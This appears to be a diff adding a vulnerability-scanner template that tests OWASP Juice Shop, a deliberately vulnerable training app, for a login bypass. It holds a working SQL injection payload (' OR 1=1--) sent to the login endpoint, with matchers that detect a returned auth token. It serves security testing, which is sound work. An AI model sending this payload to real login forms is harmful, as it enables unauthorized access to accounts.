@@ -1,0 +1,33 @@
+id: juiceshop-sqli-login-bypass
+
+info:
+  name: OWASP Juice Shop - SQL Injection Login Bypass
+  author: security-tester
+  severity: critical
+  description: Exploits the login form via SQL injection to bypass authentication.
+  tags: juiceshop, sqli, auth-bypass, owasp
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+    
+    headers:
+      Content-Type: application/json
+
+    body: '{"email":"'' OR 1=1--","password":"invalid_password"}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "authentication"
+          - "token"
+          - "bid"
+        case-insensitive: true
+        condition: and
+# digest: 4a0a0047304502202078caa63ec2b8c3e7d20773599862d6170f575206398ae1abfb267699dcc88e022100ecf8aa7d9a164c6f529a9aa690dd835c652bf4120f5abb4eabfd2e40215ffae4:2ded6eed97d125cafacc29c18bc0d60c
